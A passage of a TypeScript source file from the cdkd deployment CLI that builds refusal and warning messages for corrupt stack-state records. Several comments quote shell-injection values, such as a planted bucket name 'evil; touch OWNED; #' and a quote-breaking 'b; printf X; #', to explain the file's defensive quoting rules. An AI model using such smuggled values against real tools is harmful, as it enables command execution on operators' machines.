 * by a refusal the moment the flag comes off. So the message points at
 * `cdkd diff` instead of weakening the guard.
 */
export function malformedResourcePropertiesRefusalMessage(
  stackName: string | undefined,
  region: string | undefined,
  logicalIds: readonly string[]
): string {
  return (
    `${namedPropertyBagsClause(stackName, region, logicalIds)} 'cdkd deploy' can WRITE state and ` +
    `AWS resources, so it refuses rather than continuing — under '--dry-run' too, because the ` +
    `plan a dry run would print is the wrong one: a DELETE and re-create of resources the ` +
    `template did not change, and reading the bag as empty produces that same verdict rather ` +
    `than avoiding it. Nothing was provisioned and no state was written FOR THIS STACK. Repair or ` +
    `remove the record first; 'cdkd diff' previews the rest of the stack with those maps read ` +
    `as EMPTY and warns that it did. Inspect the record with: ` +
    `${inspectCommand(stackName, region)}`
  );
}

/**
 * The `cdkd orphan` refusal text for the per-entry `properties` container
 * (issue [#3318](https://github.com/go-to-k/cdkd/issues/3318)).
 *
 * A SECOND `properties` refusal beside
 * {@link malformedResourcePropertiesRefusalMessage}, for the reason every
 * split in this module is its own: that text describes the DIFF's verdict —
 * "a DELETE and re-create of resources the template did not change" — which
 * `cdkd orphan` never computes. It runs no diff at all.
 *
 * **And the harm here is NOT the laundering the module's other write-capable
 * refusals describe.** Measured 2026-09-17 through the real
 * `rewriteResourceReferences` over an `AWS::S3::Bucket` record: `rewriteValue`
 * returns a non-object verbatim, so a stored `"abcdef"` comes back as
 * `"abcdef"`, a `5` as `5`, a `null` as `null`, and an ABSENT bag stays absent
 * once `JSON.stringify` drops it. Nothing is fabricated and no evidence is
 * replaced — so {@link malformedOutputsRefusalMessage}'s "saved back as a
 * well-formed six-key map" sentence, true one container over, would be FALSE
 * here and must not be borrowed.
 *
 * What it DOES share is {@link namedPropertyBagsClause}, which carries a
 * diff-shaped sentence of its own ("a create-only property among them is a
 * REPLACEMENT of the live resource"). That is not a contradiction and is not
 * an oversight: the shared clause describes what the RECORD is, and the reason
 * an operator must care is precisely that a later `cdkd deploy` / `cdkd diff`
 * reaches that verdict. What this text must not do — and what its fence pins —
 * is claim that verdict as its OWN, since `cdkd orphan` computes no diff.
 *
 * What IS at stake is the command's own job. `cdkd orphan` exists to leave the
 * record deployable: it rewrites every surviving sibling's `Ref` /
 * `Fn::GetAtt` / `Fn::Sub` reference to an orphan so the next deploy neither
 * re-creates the orphan nor fails on a stale reference. Over a map it cannot
 * read it cannot do that and cannot say it did not. A scalar bag presents no
 * reference to find, so the `--force`-less hard fail on unresolvable
 * references can never fire for one; a LIST bag is the one unreadable shape
 * `rewriteValue` DOES walk (measured: a stored `[{"Ref":"<orphan>"}]` came
 * back as `["<physicalId>"]` with one row in the audit table), so its rewrites
 * are reported into a container that is still not a map. Either way the
 * command takes a lock, saves, and reports success over a record left in
 * exactly the state `cdkd deploy` REFUSES
 * ({@link malformedResourcePropertiesRefusalMessage}) and `cdkd diff` previews
 * as a replacement — one command after the evidence was last in cdkd's hands.
 *
 * **The refusal is SCOPED to the records the save would KEEP, so orphaning the
 * DAMAGED record itself still works** —
 * {@link refuseMalformedResourcePropertiesForOrphan} is handed the ids being
 * removed and never names one. Compare
 * `malformedDestroyResourcesRefusalMessage`, which has to point at a different
 * COMMAND for its way out because a destroy keeps every record it reads.
 *
 * **But that in-command way out is CONDITIONAL, and the text must say so.**
 * `cdkd orphan` addresses resources only through the `aws:cdk:path` index of
 * the SYNTHESIZED template (`resolveConstructPaths` →
 * `buildCdkPathIndex`), so an id the CDK app no longer declares — a record
 * left behind when the construct was deleted, or one a hand edit invented —
 * can never enter the orphan set for ANY invocation. The exemption therefore
 * cannot reach it, and an earlier revision of this text nonetheless told the
 * operator to "orphan the damaged record ITSELF" unconditionally: an
 * instruction that dies on `Construct path '...' not found in template`, which
 * is the misstating-the-remedy class this module's own notes record (security
 * review of go-to-k/cdkd#3318). The remedy is now stated with its condition and
 * the two unconditional ways out beside it — hand repair, and
 * `cdkd state orphan <stack>`, which needs no CDK app and drops the whole
 * record with the live resources left standing.
 *
 * So the recovery-path objection is answered for the common case by the
 * exemption and for the rest by naming commands that do not depend on the
 * template. What this does NOT claim is that `cdkd orphan` stays usable on a
 * stack holding a template-less torn record: it does not, exactly as
 * `cdkd deploy` does not (go-to-k/cdkd#3191). A state-keyed escape hatch
 * (`--orphan-logical-id`, addressing a record by its state key rather than by
 * a construct path) was considered in the same review and DECLINED: it is a new
 * mutating CLI surface whose only job is to route around a record the operator
 * must repair or drop anyway, and `cdkd state orphan <stack>` already removes
 * such a record with no CDK app and no new flag.
 *
 * It must be true under `--dry-run` as well, and it is: the guard sits at the
 * load, far above the `if (options.dryRun)` return. Refusing there is
 * {@link malformedResourcePropertiesRefusalMessage}'s call for the same
 * reason — a plausible rewrite audit table followed by a refusal the moment
 * the flag comes off is the worst arm of all.
 *
 * `rawStackName` / `rawRegion` are the CALLER's resolved identity — the synthesized
 * stack name and the region `pickStackRegion` settled on, never the record's
 * own unvalidated self-report (though an assembly-supplied stack name is not
 * validated either — go-to-k/cdkd#3360). See {@link stackClause}.
 */
export function malformedOrphanResourcePropertiesRefusalMessage(
  rawStackName: string | undefined,
  rawRegion: string | undefined,
  logicalIds: readonly string[],
  /**
   * The caller's `--profile` / resolved bucket / `--state-prefix`, threaded so
   * the remedy and the object path name the bucket the record is actually in.
   * Optional so the message stays buildable with the identity alone.
   */
  recovery?: LockRecoveryContext
): string {
  // NORMALISE ONCE, here, rather than in each of the helpers below.
  // `cdkd orphan` hands `undefined` for a legacy record with no region since
  // go-to-k/cdkd#3359 (it used to hand `pickStackRegion`'s loaded region,
  // `''` when nothing else was known), but an empty string is still not an
  // identity: `displaySafe('')` is `<unrenderable>`, so every helper that
  // treats "absent" as `undefined` renders a placeholder that names no record
  // AND collides with its own wrapping quotes. Hoisting protects every helper
  // below together — `stackClause`, `dropRecordCommand`,
  // `withheldIdentityClause` and `orphanInspectClause`; guarding inside one of
  // them fixed only part of the message (measured -- the first cut did exactly
  // that, and the other clauses still rendered `('<unrenderable>')` and
  // `--stack-region '<unrenderable>'`).
  const stackName = rawStackName === '' ? undefined : rawStackName;
  const region = rawRegion === '' ? undefined : rawRegion;
  const inspect = orphanInspectClause(stackName, region, recovery);
  const listCommand = withheldIdentityListCommand(stackName, region, recovery);
  // Every PASTEABLE command goes LAST and UNWRAPPED, one per line — never inside
  // the prose's `'...'`. A command that itself carries `shellQuote`d values
  // composes with a wrapping quote into its inverse: pasted together with the
  // wrapper, `'cdkd state orphan S --state-bucket 'b; printf X; #''` closes the
  // wrapper at the value's opening quote and RUNS `printf X` (measured, bash).
  // NOT only the bucket: the release before this carried the STACK NAME and
  // the REGION inside the same wrapper, and `displaySafe` keeps `'` and `;` —
  // so a prebuilt-assembly stack name (read unvalidated) or a region planted
  // as a state-key segment broke out on the shipped binary too; the bucket
  // (plantable from a cloned repo's `cdk.json`) is the one this review added.
  // The rule `.claude/rules/lock-contention-message.md` records for the
  // force-unlock hint, applied to the three commands here (go-to-k/cdkd#3363).
  const commands = [
    `Drop the record: ${dropRecordCommand(stackName, region, recovery)}`,
    ...(listCommand === undefined ? [] : [`Find the exact name: ${listCommand}`]),
    ...(inspect.command === undefined ? [] : [`Inspect the record: ${inspect.command}`]),
  ];
  const prose =
    `${namedPropertyBagsClause(stackName, region, logicalIds)} 'cdkd orphan' REWRITES and SAVES ` +
    `every record it keeps, so it refuses rather than continuing — under '--dry-run' too, ` +
    `because the rewrite audit table a dry run prints is the wrong one. It is not that the save ` +
    `would fabricate a map: an unreadable bag is carried through VERBATIM. It is that this ` +
    `command exists to leave the record deployable by rewriting every reference to an orphaned ` +
    `resource, and a map it cannot read hides whichever references it holds — a string or a ` +
    `number presents none to find, and a list is walked, so its rewrites are recorded into a ` +
    `container that is still not a map. Continuing would rewrite, save, and report success over ` +
    `a record 'cdkd deploy' then REFUSES. No state was written. Two ways out need no CDK app: ` +
    `repair the record by hand, or drop it whole with the 'Drop the record' command below, ` +
    `which leaves the live AWS resources standing` +
    `${withheldIdentityClause(stackName, region)}${withheldRecoveryClause(recovery)}. A third works ` +
    `only while the CDK app STILL DECLARES the ` +
    `named resource — this refusal covers just the records that would SURVIVE the save, so ` +
    `'cdkd orphan <its construct path>' removes it and repairs the rest; construct paths come ` +
    `from the synthesized template, so a resource the app no longer declares has none and must ` +
    `take one of the first two.` +
    (inspect.sentence === undefined ? '' : ` ${inspect.sentence}`);
  return [prose, ...commands, ...(inspect.locations ?? [])].join('\n');
}

/**
 * The half-sentence that accompanies a TEMPLATE drop remedy when a stack name
 * WAS known but it, or the region beside it, did not render exactly. The prose
 * above it prints the sanitized spelling, and an operator filling the template
 * from that spelling would be aiming at the healthy sibling the gate exists to
 * protect (`'prod-api '` renders as `prod-api`; a padded region is the same
 * misdirection one flag over), so the message says where to take them from
 * instead: `cdkd state list --json`, which writes the raw name
 * through `JSON.stringify` — `--long` renders through `displayIdent`, which
 * trims, so it would hand back the same spelling. Empty when the command was
 * substituted, and when no name was known at all — that arm's template already
 * reads as a hole to fill.
 */
function withheldIdentityClause(stackName: string | undefined, region: string | undefined): string {
  if (!identityWithheld(stackName, region)) return '';
  return (
    ` — the stack name or region above did not render exactly, so take them from the ` +
    `'Find the exact name' command below — replace each quoted hole, quotes included, with the ` +
    `shell-quoted value — rather than from this message`
  );
}

/**
 * The half-sentence for the OTHER thing that can print as a hole: one of the
 * account fragments `recoveryCommandFlags` appends.
 *
 * Separate from {@link withheldIdentityClause} rather than folded into it,
 * because the two holes have different SOURCES and therefore different remedies.
 * An identity hole is filled from `cdkd state list --json`, which is why that
 * clause points at a command; an account fragment came from the operator's own
 * argv, so they already hold it and no listing would help. Conflating them would
 * send someone to a listing that does not carry their `--profile`.
 *
 * Without this, a run whose PREFIX or BUCKET was the inexact value printed
 * `--state-prefix '<prefix>'` with nothing in the message saying the hole was a
 * hole: `identityWithheld` reads the stack name and the region only, and the
 * object-path note is suppressed whenever a prefix WAS supplied. That is
 * {@link withheldIdentityClause}'s own defect class, one fragment over.
 */
function withheldRecoveryClause(recovery?: LockRecoveryContext): string {
  if (recoveryCommandFlags(recovery).exact) return '';
  return (
    ` — an account fragment ('--profile', '--state-bucket' or '--state-prefix') did not render ` +
    `exactly, so the command lines below print a quoted hole in its place, which you replace ` +
    `whole — quotes included — with the SHELL-QUOTED value you passed this run`
  );
}

/**
 * The listing {@link withheldIdentityClause} points at, printed as its own
 * trailing command line. Qualified like the remedy it stands in for: a bare
 * listing after `cdkd orphan --profile prod ...` would read the DEFAULT
 * profile's bucket, and the name it hands back would then be a different
 * bucket's.
 */
function withheldIdentityListCommand(
  stackName: string | undefined,
  region: string | undefined,
  recovery?: LockRecoveryContext
): string | undefined {
  if (!identityWithheld(stackName, region)) return undefined;
  return ['cdkd state list --json', ...recoveryCommandFlags(recovery).flags].join(' ');
}

/** A name WAS known, and it or the region beside it did not render exactly. */
function identityWithheld(stackName: string | undefined, region: string | undefined): boolean {
  // `''` is no identity either, as in {@link dropRecordCommand}: otherwise a
  // later direct caller gets the withheld clause while the drop command beside
  // it takes the no-identity arm.
  if (stackName === undefined || stackName === '') return false;
  // The same `''` floor {@link dropRecordCommand} carries, so the two agree on
  // whether a region was supplied at all. Unreachable through the one builder
  // that calls this (it normalises `''` at entry) and kept for the reason
  // `dropRecordCommand` gives: a later caller inherits the floor.
  const known = region === '' ? undefined : region;
  return !(rendersExactly(stackName) && (known === undefined || rendersExactly(known)));
}

/**
 * The `cdkd state show` command on the orphan properties refusal's trailing
 * `Inspect the record:` line, for a record listed WITH a region — gated and
 * qualified exactly as the drop command on the line above it is, because it is
 * the same identity in the same message.
 * Gating only the drop command left the message contradicting itself: it said
 * the name did not render exactly, pointed at `cdkd state list --json`, and then
 * printed `cdkd state show prod-api ...` with the trimmed spelling of
 * `'prod-api '`, naming the healthy sibling (the M2 finding of the
 * go-to-k/cdkd#3363 review). Holes follow {@link dropRecordCommand}'s rule: an
 * altered region makes both a hole, an altered name only the name.
 *
 * Built here rather than by widening {@link inspectCommand}, which serves four
 * other builders whose identities come from different sources (and this one no
 * longer calls it at all).
 */
function orphanInspectCommand(
  stackName: string,
  region: string,
  recovery?: LockRecoveryContext
): string {
  const regionExact = rendersExactly(region);
  const stack =
    regionExact && rendersExactly(stackName) ? shellQuote(stackName) : commandHole('stack');
  const where = regionExact ? shellQuote(region) : commandHole('region');
  return [
    `cdkd state show ${stack} --stack-region ${where} --json`,
    ...recoveryCommandFlags(recovery).flags,
  ].join(' ');
}

/**
 * How {@link malformedOrphanResourcePropertiesRefusalMessage} tells the operator
 * to inspect the record: a `command` it prints on its trailing
 * `Inspect the record:` line, or — for the legacy region-less shape, where no
 * command can serve — a prose `sentence` naming the S3 object.
 *
 * A KNOWN stack with NO region is a legacy record (`<prefix>/<stack>/state.json`)
 * that `listStacks` lists with no region — `cdkd orphan` hands this module the
 * region the record is LISTED under since go-to-k/cdkd#3359, and that is
 * `undefined` only for such a ref (its body names no region, or the probe that
 * reads it could not). `cdkd state show` refuses such a record with or without
 * `--stack-region` ("has only a legacy state record without a region"), and the
 * migration it suggests is a `cdkd deploy`, which refuses this very record
 * (go-to-k/cdkd#3191). So ending on `cdkd state show` would hand the operator a
 * command that cannot serve them; the line names the S3 object instead. Teaching
 * `state show` to read a legacy record was the alternative, declined as a wider
 * change to a command that is not the one refusing.
 *
 * The object path is printed only when the stack name {@link rendersExactly}: a
 * path with a sanitized or truncated segment names an object that does not
 * exist. The name comes from the assembly, and `cdkd orphan` accepts a PREBUILT
 * one whose manifest nothing validates, which is what makes an inexact name
 * reachable at all (go-to-k/cdkd#3360); an S3 key's `Parent~Child` name, the
 * case the destroy refusal's gate was written for, cannot appear here.
 *
 * With `recovery` the path carries the REAL prefix and names the bucket, the
 * way the drop remedy above it is qualified; without it the prefix is a
 * placeholder and the sentence says how to fill it.
 */
function orphanInspectClause(
  stackName: string | undefined,
  region: string | undefined,
  recovery?: LockRecoveryContext
): { command?: string; sentence?: string; locations?: string[] } {
  // `''` is no identity either, the floor {@link dropRecordCommand} and
  // {@link identityWithheld} both carry. Without it a direct caller passing
  // `''` got an inspect COMMAND here while the drop line beside it took its
  // no-identity arm — the disagreement {@link rendersExactly}'s note says the
  // shared predicate rules out. Unreachable through the one builder that calls
  // this (it normalises `''` at entry), which is the condition the other two
  // floors are under as well.
  if (stackName === undefined || stackName === '') {
    // The same template the shared `inspectCommand` gives for no identity, but
    // qualified: the identity is the hole, not the account.
    const template = [
      `cdkd state show ${commandHole('stack')} --stack-region ${commandHole('region')} --json`,
      ...recoveryCommandFlags(recovery).flags,
    ].join(' ');
    return { command: template };
  }
  if (region !== undefined) {
    return { command: orphanInspectCommand(stackName, region, recovery) };
  }
  const lead =
    `The record is listed with no region — a legacy 'state.json' whose body names none, or ` +
    `one the listing could not read — which 'cdkd state show' cannot read and a 'cdkd deploy' ` +
    `will not migrate while it is torn, so inspect the object directly`;
  // The bucket and prefix are printed only when they render EXACTLY, the test
  // `recoveryCommandFlags` applies to the same two values on the commands
  // above (go-to-k/cdkd#3377): an altered one would name a different bucket or
  // key space. Otherwise the sentence falls back to the placeholder forms.
  const exactOrUndefined = (v: string | undefined): string | undefined =>
    v !== undefined && sanitizeRecoveryValue(v).exact ? v : undefined;
  // `|| undefined` floors `''` as well, and the asymmetry with the PREFIX two
  // lines down is the point: a bucket NAME cannot be empty, and
  // `recoveryCommandFlags` emits no `--state-bucket` for `''` — so a
  // `State bucket: ''` line would name nothing while this sentence promised it
  // named the bucket, and the same value would be described by two rules. An
  // empty PREFIX is a real key space (`/<stack>/state.json`), which is why it
  // keeps its own arm and why the flag emits `--state-prefix ''`.
  const bucket = exactOrUndefined(recovery?.stateBucket) || undefined;
  // The object's LOCATION is printed on labelled trailing lines, one value per
  // line, never inside this sentence — B1 of go-to-k/cdkd#3363's fourth review.
  // A shell-quoted value is only safe while the quotes before it BALANCE, and
  // English prose does not keep that promise: an apostrophe in `stack's` opened
  // a quote that closed at the bucket's own opening quote, and pasting the
  // sentence ran a `cdk.json`-planted bucket (`'evil; touch OWNED; #'`) as shell.
  // The same LAST-and-UNWRAPPED rule the commands above follow.
  const locations = bucket === undefined ? [] : [`State bucket: ${shellQuote(bucket)}`];
  // `'cdkd state info'` QUOTED, like every other fixed command name in this
  // module's prose. Unquoted it is not merely inconsistent: a reader selecting
  // the parenthetical and pasting it INVOKES the real CLI with argv
  // `["state","info","names","it"]`, where the quoted form is inert. No value is
  // interpolated, so it is not injection — but inert is strictly better, and the
  // rule that makes it inert is the one the six quoted siblings follow.
  const where =
    bucket === undefined
      ? `, in the state bucket ('cdkd state info' names it)`
      : `, in the bucket on the 'State bucket' line below`;
  if (!rendersExactly(stackName)) {
    return {
      sentence:
        `${lead}: it is the legacy 'state.json' under this stack name, which did not render ` +
        `exactly${where}.`,
      locations,
    };
  }
  const prefix = exactOrUndefined(recovery?.statePrefix);
  const key = shellQuote(`${prefix ?? '<prefix>'}/${stackName}/state.json`);
  // The fill-in note only when no prefix was SUPPLIED: one that was supplied but
  // did not render exactly is not the default, so the note would mislead.
  // Its OWN sentence rather than a second parenthetical: appended to `where`'s
  // it rendered `... (cdkd state info names it) (its prefix is ...)`, two
  // bracketed asides in a row that read as one nested aside. The flag name is
  // quoted for the reason `where`'s is.
  // THREE arms, not two. The middle one is the object key's own hole, which
  // `withheldRecoveryClause` does not cover and must not claim to: that clause
  // is about the COMMAND lines, where a hole is quoted and replaced whole,
  // while `<prefix>` here sits INSIDE the single quotes wrapping the whole key,
  // so "quotes included" would have an operator build `''custom''/S/state.json'`
  // (go-to-k/cdkd#3439 review). Said here, where the hole actually is.
  const fill =
    recovery?.statePrefix === undefined
      ? ` Its prefix is 'cdkd' unless '--state-prefix' was given.`
      : prefix === undefined
        ? // QUOTED, even though this is prose and not a command. A bare
          // `<prefix>` is two shell redirections, and prose is pasteable --
          // measured on the first cut of this very sentence: selected and
          // pasted in a directory holding a file named `prefix`, `<prefix`
          // read it and `>` then truncated a file named `where`. The rule
          // `commandHole` exists for does not stop at the command lines
          // (go-to-k/cdkd#3440 review, the third round of this class).
          ` The prefix you passed did not render exactly, so the key shows the hole ` +
          `'<prefix>' where it belongs; put your own value there, inside the outer quotes.`
        : '';
  return {
    sentence: `${lead}: the 'Object key' line below names it${where}.${fill}`,
    locations: [`Object key: ${key}`, ...locations],
  };
}

/**
 * For `cdkd orphan`: refuse a record whose SURVIVING resource entries carry a
 * `properties` bag that cannot be read (issue
 * [#3318](https://github.com/go-to-k/cdkd/issues/3318)).
 *
 * A separate call from {@link refuseMalformedResourceProperties} rather than a
 * flag on it, for the reason {@link refuseMalformedOutputsForDestroy} is
 * separate from {@link refuseMalformedOutputs}: the refusal a user sees must
 * describe what THIS command would have done with the bag, and
 * {@link malformedOrphanResourcePropertiesRefusalMessage} records how far the
 * two consequences diverge.
 *
 * `removedLogicalIds` is the orphan set — the ids this run is dropping from
 * `state.resources`. They are EXCLUDED from the verdict because the save
 * cannot persist a record it is deleting, and because refusing on one would
 * break the recovery path the refusal is otherwise meant to preserve.
 *
 * **It covers `state.resources` ONLY, and the save keeps more than that.**
 * `rewriteResourceReferences` spreads `carriedState`, so `state.orphans[]` —
 * rollback-orphaned records each holding a whole `ResourceState`
 * (go-to-k/cdkd#2934) — rides through untouched, and
 * {@link unreadableResourcePropertyBags} never walks it. A torn bag parked
 * there is therefore still saved, and `computeStackDiff` splices those records
 * into `state.resources` on the next preview. Stated rather than implied,
 * because "the records the save would KEEP" reads wider than what this scans:
 * the gap is go-to-k/cdkd#3344, filed rather than folded in because the remedy
 * differs — an entry in that container has no construct path, so the message's
 * third way out is meaningless for it.
 *
 * **A surviving ENTRY that is not a map is the other gap, and it DOES launder.**
 * This scan asks whether a resource's `properties` is readable; it never asks
 * whether the resource RECORD is. `isReadableBag('abcdef')` is false, so a
 * string entry is skipped here, and then `rewriteResourceReferences`'s
 * `{ ...resource }` spreads it into per-character keys — the record is SAVED as
 * `{"0":"a",…,"dependencies":[]}` and the run reports success. A number entry
 * saves as `{"dependencies":[]}`, a record with no `physicalId`. So the
 * refusal's own text, which says a torn `properties` map is persisted verbatim
 * rather than reshaped, is true of the container it scans and NOT of the one
 * above it.
 *
 * That gap is NOT go-to-k/cdkd#3202's as filed — that issue records only the
 * `null`-entry `TypeError` — and NOT open PR go-to-k/cdkd#3226's, whose file
 * list carries neither `orphan.ts` nor `orphan-rewriter.ts`. A lane closing
 * either one leaves this open, which is why it is named here rather than
 * deferred to them by reference. Filed as go-to-k/cdkd#3350.
 *
 * CALL IT AT THE LOAD, beside {@link refuseMalformedState} and
 * {@link refuseMalformedOutputs}, above `rewriteResourceReferences` — the
 * placement rule {@link repairMalformedResourcesForReadOnly}'s note records.
 * The orphan set is resolved from the synthesized template before the state is
 * loaded, so nothing forces this call any lower.
 */
export function refuseMalformedResourcePropertiesForOrphan(
  state: StackState,
  removedLogicalIds: readonly string[],
  stackName: string | undefined,
  region: string | undefined,
  /** See {@link malformedOrphanResourcePropertiesRefusalMessage}. */
  recovery?: LockRecoveryContext
): void {
  const removed = new Set(removedLogicalIds);
  const unreadable = unreadableResourcePropertyBags(state).filter((id) => !removed.has(id));
  if (unreadable.length === 0) return;
  // NOT `markNonRetryable`, and for the reason {@link refuseMalformedState}
  // states for the same command: `cdkd orphan` raises this from its own top
  // level — `rewriteResourceReferences` is called from nowhere else — so there
  // is no `withRetry` for the marker to fence. Named in
  // `tests/unit/state/malformed-resources-bag.test.ts`'s UNMARKED table beside
  // its siblings, so another refusal still cannot join them silently.
  throw new CdkdError(
    malformedOrphanResourcePropertiesRefusalMessage(stackName, region, unreadable, recovery),
    STATE_RESOURCES_MALFORMED
  );
}

/**
 * The warning a caller of {@link repairMalformedResourcePropertiesForReadOnly}
 * emits.
 */
export function malformedResourcePropertiesWarning(
  stackName: string | undefined,
  region: string | undefined,
  logicalIds: readonly string[]
): string {
  return (
    `${namedPropertyBagsClause(stackName, region, logicalIds)} Continuing with those maps ` +
    `EMPTY: what these records are stored as holding is NOT what this preview compares against. ` +
    `Where the template still declares the resource, every property it declares previews as an ` +
    `addition and a create-only one as a replacement; where it no longer declares it, the ` +
    `DELETE row shows an empty previous side instead of the stored one. ` +
    `Do NOT run 'cdkd deploy' against this record — it REFUSES on the same defect rather than ` +
    `acting on this preview. See the stored values with: ${inspectCommand(stackName, region)}`
  );
}

// The record / coordinate key helpers moved to the import-free leaf
// `src/state/record-keys.ts` (go-to-k/cdkd#3323): their consumers span the
// cli, state and deployment layers, and `state-list-tree.ts` is deliberately
// kept with no imports at all. RE-EXPORTED here so no existing importer moved.
export { producerRecordKey, producerCoordinateKey } from './record-keys.js';

/**
 * How many unreadable logical ids a message names before summarizing. Read by
 * every builder that names ids — the refusal below, `namedEntriesClause` and
 * `malformedOrphanRecordsWarning` — so "the refusal below" was the count of
 * readers at the time it was written, not a scope.
 *
 * Five rather than the ten the `cdkd export` baseline report uses: this text
 * already carries the remedy command, and that command has to stay on the
 * reader's screen (the reason {@link safeIdentifier} caps a name at all).
 */
const NAMED_UNREADABLE_ENTRIES = 5;

/**
 * The logical ids of every `resources` ENTRY that is not a readable object.
 *
 * A DIFFERENT shape from the unreadable BAG the rest of this module is about,
 * and one {@link hasReadableResources} says nothing about: it tests the bag, so
 * `{"resources": {"R": null}}` passes it and the `null` surfaces one
 * dereference later (issue go-to-k/cdkd#3018 items 1 and 2). Returns `[]` for an
 * unreadable BAG rather than inventing ids from it — a string bag would
 * otherwise yield one "id" per character. That makes the two refusals
 * ORDER-INDEPENDENT rather than ordered: whichever runs first, an unreadable
 * bag leaves this one silent and is caught by {@link refuseMalformedState}.
 * What a caller must not do is take only this one.
 */
export function unreadableResourceEntries(state: StackState): readonly string[] {
  if (!hasReadableResources(state)) return [];
  return Object.entries(state.resources)
    .filter(([, entry]) => !isReadableResourceEntry(entry))
    .map(([logicalId]) => logicalId);
}

/**
 * Can this ENTRY be read as a resource record at all?
 *
 * Object-ness is NOT the whole question, and taking {@link isReadableBag} for
 * the answer left a shape crashing one line past the guard: `{"R": {}}` is an
 * object, so it passed, and then `resource.resourceType.startsWith(...)` threw
 * — the same bare `TypeError` the `null` entry beside it no longer produces.
 * `resourceType` is the one field every reader of an entry touches before any
 * other (the Custom-Resource routing, the provider lookup, the skip list), so
 * it is the field that decides whether the row can be read at all.
 *
 * Deliberately NOT a widening of {@link isReadableBag}. That predicate answers
 * a question about CONTAINERS — the bag, and the four rendered containers
 * go-to-k/cdkd#3187 added — and a resource-shaped test there would refuse an
 * `outputs` map for having no `resourceType`.
 *
 * It stops at `resourceType` rather than checking `physicalId` or `properties`
 * too, and the message this feeds says only what it checks: a row with a type
 * but no physical id IS readable here, fails per-resource where it is used, and
 * is reported by that command in its own terms.
 */
export function isReadableResourceEntry(entry: unknown): boolean {
  return (
    isReadableBag(entry) && typeof (entry as { resourceType?: unknown }).resourceType === 'string'
  );
}

/**
 * For a command that READS each resource record and WRITES the bag back: refuse
 * the record naming the entries it could not read.
 *
 * **Deliberately NOT folded into {@link refuseMalformedState}**, and the reason
 * is behavioural rather than tidiness: folding it would decide, for every one of
 * that function's callers at once, that ANY unreadable row blocks the whole
 * command — a call none of them has made. `cdkd rollback` is the counter-example
 * that settles it: its executor reaches a record by logical id and treats a
 * falsy one as `skip-already-done`, so an unrelated broken row costs it nothing
 * and refusing would stop the command documented as the way to UNWIND a stack
 * whose state is already suspect. The other callers (`cdkd import`,
 * `cdkd orphan`, `cdkd scrub`) each owe their own classification; `cdkd orphan`
 * does still throw on an unreadable sibling, which is why that one is tracked on
 * go-to-k/cdkd#3202 rather than answered here by a shared refusal.
 *
 * So the entry rule is OPT-IN, taken by a flow that dereferences EVERY entry and
 * writes the record back.
 *
 * REFUSE rather than skip, at both sites that take it — `cdkd state
 * refresh-observed`, and `cdkd drift` under `--accept` / `--revert` — because
 * each is a WRITER. Skipping would report a clean run (`N refreshed, M
 * unsupported`; `N resources checked`) with the corrupt entries invisible and
 * then save the record back, so the ONE thing the user could have acted on
 * would be the thing the run did not say. Naming them costs nothing a skip
 * would have preserved either: both refusals happen before this stack's lock
 * and before any AWS read of it, so no partial work on it is thrown away.
 *
 * PER STACK, which is why the message says so — and the callers reach a
 * multi-stack refusal differently. `cdkd state refresh-observed` checks every
 * target's shape before it saves any, so a record ALREADY malformed stops the
 * run before a write; only one edited between that check and its own refresh
 * reaches this call after the stacks ahead of it were saved. `cdkd drift --all`
 * collects every stack's report before either writer runs. The message cannot
 * tell which case it is in, so it claims only what holds for both.
 *
 * That is not an argument that a skip is always wrong — the read-only twin
 * {@link repairMalformedResourceEntriesForReadOnly} does exactly that, for
 * plain `cdkd drift` and `cdkd diff`, and warns. What makes the difference is
 * the WRITE, not the shape.
 *
 * Unlike {@link repairMalformedResourcesForReadOnly} this never mutates: the
 * entries stay exactly as stored, which is what keeps the record's own evidence
 * intact for whoever inspects it next.
 */
export function refuseMalformedResourceEntries(
  state: StackState,
  stackName: string,
  region: string
): void {
  const unreadable = unreadableResourceEntries(state);
  if (unreadable.length === 0) return;
  throw new CdkdError(
    malformedResourceEntriesRefusalMessage(stackName, region, unreadable),
    STATE_RESOURCES_MALFORMED
  );
}

/**
 * For a READ-ONLY command: drop every entry {@link unreadableResourceEntries}
 * names, so the command can report on the rest, and return what it dropped so
 * the caller can warn.
 *
 * The entry-level twin of {@link repairMalformedResourcesForReadOnly}, and it
 * makes the same trade for the same reason: a command that cannot WRITE cannot
 * launder anything, and reporting on the readable resources beats aborting on
 * the first unreadable one. It is a DROP rather than a repair-to-`{}` because
 * there is no empty `ResourceState` that would be honest — a record with no
 * `resourceType` and no `physicalId` names no AWS resource — so the entry leaves
 * the working copy entirely and the caller says so.
 *
 * Call it AFTER {@link repairMalformedResourcesForReadOnly}: an unreadable BAG
 * has no entries to drop, and {@link unreadableResourceEntries} deliberately
 * returns `[]` for one rather than inventing ids from a string's characters.
 *
 * Mutates the in-memory record only. Every caller today renders from the
 * command's own derived output rather than echoing the record back, so the drop
 * is visible as missing ROWS — which is exactly what the warning describes.
 */
export function repairMalformedResourceEntriesForReadOnly(state: StackState): readonly string[] {
  const unreadable = unreadableResourceEntries(state);
  for (const logicalId of unreadable) {
    delete state.resources[logicalId];
  }
  return unreadable;
}

/** The warning a caller of {@link repairMalformedResourceEntriesForReadOnly} emits. */
export function malformedResourceEntriesWarning(
  stackName: string,
  region: string,
  logicalIds: readonly string[]
): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  return (
    `${namedEntriesClause(stackName, region, logicalIds)} Continuing WITHOUT them: this ` +
    `command's output describes the remaining resources only, which is not the same as the ` +
    `stack holding none of these. See the stored values with: cdkd state show ` +
    `${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * The `orphans[]` twin of {@link malformedResourceEntriesWarning}, and a
 * SEPARATE text rather than a parameter on that one.
 *
 * The shared clause says "holds N resource record(s) … the remaining resources
 * only", which sends a reader to the wrong container: the id it names was read
 * from `orphans`, and what that clause describes is the `resources` map
 * (go-to-k/cdkd#3226 review round 5, M16). Neither "the id is not in
 * `resources`" nor "that map is healthy" is safe to assert — an already-managed
 * logical id appears in both containers, and both can be damaged in one record,
 * which is the case where BOTH texts fire for one stack in one run, opening with
 * the identical sentence and differing only in the id list. That is why the
 * container has to be IN the sentence rather than inferred from it.
 *
 * What it does NOT say, deliberately: that the record would have been adopted.
 * `planOrphanAdoption` decides that, and a record it would have declined for
 * an unrelated reason (already managed, a type this binary cannot route) is
 * dropped here just the same — promising an adoption that was never going to
 * happen is the {@link malformedResourcePropertiesWarning} over-claim one
 * container over.
 *
 * Identifiers take the same path as every other builder here: the stack at
 * `safeStackName`, the region at `safeRegion`, each id through
